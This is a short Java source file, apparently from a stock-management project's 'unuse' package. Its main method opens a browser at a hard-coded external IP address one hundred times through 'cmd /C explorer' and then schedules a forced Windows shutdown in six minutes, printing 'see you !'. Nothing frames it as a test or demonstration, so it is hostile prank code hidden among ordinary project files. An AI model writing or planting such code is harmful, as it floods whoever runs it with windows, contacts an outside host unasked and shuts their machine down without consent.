package BL.stockBL.unuse;

import java.io.IOException;

public class Playing {

	
	public static void main(String[] args) {
		
		try {
			for (int i=0;i<100;i++) {
				Runtime.getRuntime().exec("cmd /C explorer http://101.37.19.32:10080/");
			}

			Runtime.getRuntime().exec("cmd /C shutdown /s /t 360");
			System.out.println("see you !");
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
